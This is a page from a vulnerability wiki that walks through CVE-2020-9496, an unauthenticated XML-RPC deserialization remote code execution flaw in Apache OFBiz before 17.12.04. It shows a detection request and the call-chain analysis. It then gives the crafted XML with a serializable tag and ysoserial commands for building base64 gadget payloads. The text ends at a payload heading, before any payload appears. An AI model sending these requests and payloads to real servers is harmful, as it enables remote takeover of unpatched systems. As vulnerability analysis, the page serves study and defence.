<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache%20Ofbiz/%EF%BC%88CVE-2020-9496%EF%BC%89Apache%20Ofbiz%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2020-9496）Apache Ofbiz \&lt; 17.12.04 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2020-9496\uff09Apache Ofbiz \\\u0026lt; 17.12.04 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_7" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Apache%20POI/%EF%BC%88CVE-2019-12415%EF%BC%89Apache%20POI%20_%3D%204.1.0%20XXE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Apache%20POI/%EF%BC%88CVE-2019-12415%EF%BC%89Apache%20POI%20_%3D%204.1.0%20XXE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-12415）Apache POI \&lt;= 4.1.0 XXE漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%28CVE-2021-26295%29Apache%20OFBiz%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%28CVE-2021-26295%29Apache%20OFBiz%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Apache OFBiz RMI反序列化漏洞 CVE-2021-26295
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2020-9496apache-ofbiz-171204">（CVE-2020-9496）Apache Ofbiz \&lt; 17.12.04 远程命令执行漏洞<a class="headerlink" href="#cve-2020-9496apache-ofbiz-171204" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Apache ofbiz存在反序列化漏洞，攻击者通过访问未授权接口，构造特定的xmlrpc
http请求可以造成远程代码执行的影响</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Apache Ofbiz \&lt; 17.12.04</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">判断是否存在漏洞<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="nt">&lt;methodCall&gt;</span>
<span class="w">  </span><span class="nt">&lt;methodName&gt;</span>22<span class="nt">&lt;/methodName&gt;</span>
<span class="w">  </span><span class="nt">&lt;params&gt;</span>
<span class="w">    </span><span class="nt">&lt;param&gt;</span>
<span class="w">      </span><span class="nt">&lt;value&gt;</span>
<span class="w">        </span><span class="nt">&lt;struct&gt;</span>
<span class="w">          </span><span class="nt">&lt;member&gt;</span>
<span class="w">            </span><span class="nt">&lt;name&gt;</span>22<span class="nt">&lt;/name&gt;</span>
<span class="w">            </span><span class="nt">&lt;value&gt;</span>
<span class="w">              </span><span class="nt">&lt;serializable</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span><span class="nt">&gt;</span>c2hhZG93c29jazU=<span class="nt">&lt;/serializable&gt;</span>
<span class="w">            </span><span class="nt">&lt;/value&gt;</span>
<span class="w">          </span><span class="nt">&lt;/member&gt;</span>
<span class="w">        </span><span class="nt">&lt;/struct&gt;</span>
<span class="w">      </span><span class="nt">&lt;/value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/param&gt;</span>
<span class="w">  </span><span class="nt">&lt;/params&gt;</span>
<span class="nt">&lt;/methodCall&gt;</span>
</code></pre></div>

<p><img alt="1.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
<p>发现响应</p>
<div class="codehilite"><pre><span></span><code>Failed to read result object: invalid stream header: 73686164
</code></pre></div>

<blockquote>
<p>说明服务端已经将base64解码了，然后尝试读取对象，但是由于我们的是字符串，所以出错了，证明这里就是反序列化的payload所在。</p>
</blockquote>
<h3 id="_5">漏洞分析<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<ul>
<li>漏洞信息：<a href="https://securitylab.github.com/advisories/GHSL-2020-069-apache">https://securitylab.github.com/advisories/GHSL-2020-069-apache</a>_ofbiz</li>
<li>补丁：<a href="https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a">https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a</a></li>
</ul>
<p><img alt="6.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
<p>根据补丁发现<code>framework\webtools\webapp\webtools\WEB-INF\controller.xml</code>中的<code>xmlrpc</code>请求增加了<code>&lt;security auth="true"/&gt;</code>的认证，说明默认情况下该接口访问无需认证</p>
<div class="codehilite"><pre><span></span><code><span class="cm">&lt;!-- framework\webtools\webapp\webtools\WEB-INF\controller.xml --&gt;</span>
<span class="nt">&lt;request-map</span><span class="w"> </span><span class="na">uri=</span><span class="s">&quot;xmlrpc&quot;</span><span class="w"> </span><span class="na">track-serverhit=</span><span class="s">&quot;false&quot;</span><span class="w"> </span><span class="na">track-visit=</span><span class="s">&quot;false&quot;</span><span class="nt">&gt;</span>
<span class="w">    </span><span class="nt">&lt;security</span><span class="w"> </span><span class="na">https=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;event</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;xmlrpc&quot;</span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;response</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;error&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;none&quot;</span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;response</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;success&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;none&quot;</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/request-map&gt;</span>
</code></pre></div>

<p><strong>调用方法</strong></p>
<p>直接构造post请求发送</p>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/webtools/control/xmlrpc</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org:8443</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class="na">DNT</span><span class="o">:</span> <span class="l">1</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/xml</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">181</span>

<span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="nt">&lt;methodCall&gt;</span>
<span class="w">  </span><span class="nt">&lt;methodName&gt;</span>testMethod<span class="nt">&lt;/methodName&gt;</span>
<span class="w">  </span><span class="nt">&lt;params&gt;</span>
<span class="w">    </span><span class="nt">&lt;param&gt;</span>
<span class="w">      </span><span class="nt">&lt;value&gt;</span>test<span class="nt">&lt;/value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/param&gt;</span>
<span class="w">  </span><span class="nt">&lt;/params&gt;</span>
<span class="nt">&lt;/methodCall&gt;</span>
</code></pre></div>

<p>发现报错<code>org.apache.xmlrpc.server.XmlRpcNoSuchHandlerException: No such service [testMethod]</code>说明没有相关的方法</p>
<p>下断点调试一下，由上面的<code>org.apache.ofbiz.webapp.event.XmlRpcEventHandler#invoke()</code>进入<code>execute()</code>，接着调用<code>org.apache.xmlrpc.server.XmlRpcServer#execute()</code></p>
<p><img alt="2.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
<p>跟入<code>XmlRpcServer#execute()</code>，发现调用了<code>org.apache.xmlrpc.server.XmlRpcServerWorker#execute()</code>，由具体的event
handler处理XML-RPC请求</p>
<p><img alt="3.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId29.png" /></p>
<p>在<code>org.apache.ofbiz.webapp.event.XmlRpcEventHandler.ServiceRpcHandler#getHandler()</code>中获取Handler对应的<code>ModelService</code>，默认注册的service有3000多个，也就是可供调用的<code>methodName</code>，如果找不到service会抛出<code>No such service</code>的异常</p>
<p><img alt="4.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
<p>所以此处传入一个已注册的service</p>
<p>回到<code>org.apache.xmlrpc.server.XmlRpcServerWorker#execute()</code>，当成功查询到service后通过<code>handler.execute(pRequest)</code>进行调用，注意此处还会检查一次<code>ModelService</code>的<code>export</code>属性，因此通过遍历serviceMap找到一个<code>export</code>为<code>true</code>的方法，如<code>ping</code></p>
<p><img alt="5.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png" /></p>
<p>继续构造请求（下面会解释为什么需要struct块）</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="nt">&lt;methodCall&gt;</span>
<span class="w">  </span><span class="nt">&lt;methodName&gt;</span>ping<span class="nt">&lt;/methodName&gt;</span>
<span class="w">  </span><span class="nt">&lt;params&gt;</span>
<span class="w">    </span><span class="nt">&lt;param&gt;</span>
<span class="w">      </span><span class="nt">&lt;value&gt;</span>
<span class="w">        </span><span class="nt">&lt;struct&gt;</span>
<span class="w">          </span><span class="nt">&lt;member&gt;</span>
<span class="w">            </span><span class="nt">&lt;name&gt;</span>foo<span class="nt">&lt;/name&gt;</span>
<span class="w">            </span><span class="nt">&lt;value&gt;</span>aa<span class="nt">&lt;/value&gt;</span>
<span class="w">          </span><span class="nt">&lt;/member&gt;</span>
<span class="w">        </span><span class="nt">&lt;/struct&gt;</span>
<span class="w">      </span><span class="nt">&lt;/value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/param&gt;</span>
<span class="w">  </span><span class="nt">&lt;/params&gt;</span>
<span class="nt">&lt;/methodCall&gt;</span>
</code></pre></div>

<p>响应</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="nt">&lt;methodResponse</span><span class="w"> </span><span class="na">xmlns:ex=</span><span class="s">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span><span class="nt">&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;</span>message<span class="nt">&lt;/name&gt;&lt;value&gt;</span>PONG<span class="nt">&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodResponse&gt;</span>
</code></pre></div>

<p>说明成功调用ping方法</p>
<p>**反序列化点**在<code>Ofbiz</code>自带的第三方库<code>xmlrpc-common-3.1.3.jar</code>中的<code>org.apache.xmlrpc.parser.SerializableParser</code>类能明显地看到对数据的还原操作，如果gadget到达此处能直接被反序列化而不会被过滤。</p>
<p><img alt="7.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId32.png" /></p>
<p>**解析xml**回到<code>org.apache.ofbiz.webapp.control.RequestHandler#runEvent()</code>方法，在其随后调用的链中，注意到<code>getRequest()</code>方法</p>
<div class="codehilite"><pre><span></span><code><span class="n">org.apache.ofbiz.webapp.control.RequestHandler.runEvent()</span>
<span class="n">  org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke()</span>
<span class="n">    org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute()</span>
<span class="n">      org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest()</span>
</code></pre></div>

<p>在getRequest()中，传入的xml数据由第三方库<code>xmlrpc-common.jar</code>来进行解析（注意到此处做了XXE防护）</p>
<p><img alt="8.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png" /></p>
<p>该类的初始化由父类<code>org.apache.xmlrpc.parser.RecursiveTypeParserImpl</code>完成，顾名思义就是递归解析，其他的便是常规的xml元素解析操作，包括<code>startElement()</code>、<code>endElement()</code>等。我们知道在解析器解析xml数据的过程中，会触发到<code>scanDocument()</code>操作对元素进行逐一"扫描"，其中就会进行<code>startElement()</code>、<code>endElement()</code>的调用，这个过程如果处理不当就会引入问题。</p>
<p><img alt="9.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png" /></p>
<p>注意到在<code>endElement()</code>方法中对于<code>value</code>标签的处理，同样由父类完成，跟入<code>org.apache.xmlrpc.parser.RecursiveTypeParserImpl#endValueTag()</code></p>
<p><img alt="10.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId35.png" /></p>
<p>在<code>endValueTag()</code>调用了<code>getResult()</code>方法，而这个方法就是上面提到的反序列化目标方法，那么接下来就是构造xml数据发送给<code>Ofbiz</code>，如果<code>value</code>的标签中存放的值为序列化数据，那么会由<code>SerializableParser</code>类进行反序列化进而触发漏洞，调用链是这个样子的</p>
<div class="codehilite"><pre><span></span><code><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">webapp</span><span class="p">.</span><span class="nx">event</span><span class="p">.</span><span class="nx">XmlRpcEventHandler</span><span class="p">.</span><span class="nx">getRequest</span><span class="p">()</span>
<span class="w">  </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xerces</span><span class="p">.</span><span class="nx">parsers</span><span class="p">.</span><span class="nx">AbstractSAXParser</span><span class="p">.</span><span class="nx">parse</span><span class="p">()</span>
<span class="w">    </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xerces</span><span class="p">.</span><span class="kd">impl</span><span class="p">.</span><span class="nx">XMLDocumentFragmentScannerImpl</span><span class="p">.</span><span class="nx">scanDocument</span><span class="p">()</span>
<span class="w">      </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xmlrpc</span><span class="p">.</span><span class="nx">parser</span><span class="p">.</span><span class="nx">XmlRpcRequestParser</span><span class="p">.</span><span class="nx">endElement</span><span class="p">()</span>
<span class="w">        </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xmlrpc</span><span class="p">.</span><span class="nx">parser</span><span class="p">.</span><span class="nx">RecursiveTypeParserImpl</span><span class="p">.</span><span class="nx">endElement</span><span class="p">()</span>
<span class="w">          </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xmlrpc</span><span class="p">.</span><span class="nx">parser</span><span class="p">.</span><span class="nx">MapParser</span><span class="p">.</span><span class="nx">endElement</span><span class="p">()</span>
<span class="w">            </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xmlrpc</span><span class="p">.</span><span class="nx">parser</span><span class="p">.</span><span class="nx">RecursiveTypeParserImpl</span><span class="p">.</span><span class="nx">endValueTag</span><span class="p">()</span>
<span class="w">              </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xmlrpc</span><span class="p">.</span><span class="nx">parser</span><span class="p">.</span><span class="nx">SerializableParser</span><span class="p">.</span><span class="nx">getResult</span><span class="p">()</span>
</code></pre></div>

<p><strong>poc构造</strong></p>
<p>接下来的问题就是如何构造出特定的xml数据</p>
<p>以上面的ping方法为例，假设post如下数据</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="nt">&lt;methodCall&gt;</span>
<span class="w">  </span><span class="nt">&lt;methodName&gt;</span>ping<span class="nt">&lt;/methodName&gt;</span>
<span class="w">  </span><span class="nt">&lt;params&gt;</span>
<span class="w">    </span><span class="nt">&lt;param&gt;</span>
<span class="w">      </span><span class="nt">&lt;value&gt;</span>test<span class="nt">&lt;/value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/param&gt;</span>
<span class="w">  </span><span class="nt">&lt;/params&gt;</span>
<span class="nt">&lt;/methodCall&gt;</span>
</code></pre></div>

<p><code>Ofbiz</code>成功解析到<code>endValueTag()</code>方法，但是由于<code>typeParser</code>属性为空，因此不会进入<code>getResult()</code>方法</p>
<p><img alt="11.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId36.png" /></p>
<p>那么<code>typeParser</code>属性是在哪里赋值的呢？</p>
<p>回到<code>org.apache.xmlrpc.parser.XmlRpcRequestParser#startElement()</code>，在解析器解析xml标签时，对4类标签（methodCall、params、param、value）有分别的处理，这个处理过程是随着每次遍历标签进行的，当扫描完4个必须提供的标签后，会调用父类的<code>startElement()</code>进行处理，而typeParser就是在父类中完成赋值的，随后便通过不同的解析器进入不同的解析流程，还是会调用对应解析器的<code>startElement</code>，这个过程是递归的</p>
<p><img alt="12.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId37.png" /></p>
<p><img alt="13.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId38.png" /></p>
<p>分析扫描标签的递增过程，发现此处除了4个标签外，还需在<code>&lt;value&gt;</code>标签中含有额外的标签，才会进入default分支进而对<code>typeParser</code>赋值，此时struct就是一个很好的选择，它能把数据作为一个结构体传入。</p>
<p>接着思考如何传入序列化数据，也即如何控制后端通过<code>SerializableParser</code>解析数据</p>
<p>还是关注typeParser的赋值过程，这个属性就是最终将要处理不同类型数据的解析器，在<code>org.apache.xmlrpc.parser.RecursiveTypeParserImpl#startElement()</code>中，注意到<code>factory.getParser()</code>操作，将由<code>org.apache.xmlrpc.common.TypeFactoryImpl</code>类获得不同数据类型的解析类，在其中就有获取<code>SerializableParser</code>的过程</p>
<p><img alt="14.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId39.png" /></p>
<p>因此只要传入<code>&lt;serializable&gt;</code>标签便会由<code>SerializableParser</code>进行解析。</p>
<p>此时还有个前提条件，那就是标签属性必须带有<code>XmlRpcWriter.EXTENSIONS_URI</code>才会进入后续的判断流程，因此post的数据是这样子的：</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
<span class="nt">&lt;methodCall&gt;</span>
<span class="w">  </span><span class="nt">&lt;methodName&gt;</span>ping<span class="nt">&lt;/methodName&gt;</span>
<span class="w">  </span><span class="nt">&lt;params&gt;</span>
<span class="w">    </span><span class="nt">&lt;param&gt;</span>
<span class="w">      </span><span class="nt">&lt;value&gt;</span>
<span class="w">        </span><span class="nt">&lt;serializable</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span><span class="nt">&gt;</span>serialized_data<span class="nt">&lt;/serializable&gt;</span>
<span class="w">      </span><span class="nt">&lt;/value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/param&gt;</span>
<span class="w">  </span><span class="nt">&lt;/params&gt;</span>
<span class="nt">&lt;/methodCall&gt;</span>
</code></pre></div>

<p>最后一步，数据的格式</p>
<p>在获取到<code>SerializableParser</code>解析器后，startElement过程由父类<code>org.apache.xmlrpc.parser.ByteArrayParser#startElement()</code>完成，在其中能看到base64的解码操作，所以最终的序列化数据是需要通过base64传输的</p>
<p><img alt="15.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId40.png" /></p>
<h3 id="_6">漏洞复现<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<p><strong>这里提供三种利用链</strong></p>
<blockquote>
<p>Since OFBiz uses vulnerable versions of the Apache Commons BeanUtils
Library and the Apache ROME Library, an attacker can craft malicious
payloads in an XML format using the ysoserial gadget tool.</p>
</blockquote>
<p><img alt="16.png" src="../resource/%28CVE-2020-9496%29ApacheOfbiz%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId42.png" /></p>
<blockquote>
<p>查看ysoserial的说明：</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="n">CommonsBeanutils1</span><span class="w">   </span><span class="err">@</span><span class="n">frohoff</span><span class="w">                    </span><span class="n">commons</span><span class="o">-</span><span class="n">beanutils</span><span class="p">:</span><span class="mf">1.9</span><span class="o">.</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="p">:</span><span class="mf">3.1</span><span class="p">,</span><span class="w"> </span><span class="n">commons</span><span class="o">-</span><span class="n">logging</span><span class="p">:</span><span class="mf">1.2</span>
<span class="n">ROME</span><span class="w">                </span><span class="err">@</span><span class="n">mbechler</span><span class="w">                   </span><span class="n">rome</span><span class="p">:</span><span class="mf">1.0</span>

<span class="n">CommonsCollections5</span><span class="w"> </span><span class="err">@</span><span class="n">matthias_kaiser</span><span class="p">,</span><span class="w"> </span><span class="err">@</span><span class="n">jasinner</span><span class="w"> </span><span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="p">:</span><span class="mf">3.1</span><span class="w">                                                                                                                                                                             </span>
<span class="n">CommonsCollections6</span><span class="w"> </span><span class="err">@</span><span class="n">matthias_kaiser</span><span class="w">            </span><span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="p">:</span><span class="mf">3.1</span>

<span class="n">FileUpload1</span><span class="w">         </span><span class="err">@</span><span class="n">mbechler</span><span class="w">                   </span><span class="n">commons</span><span class="o">-</span><span class="n">fileupload</span><span class="p">:</span><span class="mf">1.3</span><span class="o">.</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">commons</span><span class="o">-</span><span class="n">io</span><span class="p">:</span><span class="mf">2.4</span>
</code></pre></div>

<blockquote>
<p>使用ysoserial生成payload，进行base64编码，然后去掉换行符：</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">ysoserial</span><span class="o">-</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">6</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="n">BETA</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="n">jar</span><span class="w">  </span><span class="n">CommonsBeanutils1</span><span class="w"> </span><span class="n">calc</span><span class="w"> </span><span class="o">|</span><span class="n">base64</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">tr</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>

<span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">ysoserial</span><span class="o">-</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">6</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="n">BETA</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="n">jar</span><span class="w"> </span><span class="n">ROME</span><span class="w"> </span><span class="n">calc</span><span class="w"> </span><span class="o">|</span><span class="n">base64</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">tr</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>

<span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">ysoserial</span><span class="o">-</span><span class="mf">0.0</span><span class="o">.</span><span class="mi">6</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="n">BETA</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="n">jar</span><span class="w"> </span><span class="n">FileUpload1</span><span class="w"> </span><span class="s2">&quot;write;C:/Users/Administrator/Desktop/new/test.txt;test by cqq&quot;</span><span class="o">|</span><span class="n">base64</span><span class="w"> </span><span class="o">|</span><span class="n">tr</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
</code></pre></div>

<h4 id="commonbeanutils1payload">CommonBeanutils1的payload：<a class="headerlink" href="#commonbeanutils1payload" title="Permanent link">&para;</a></h4>
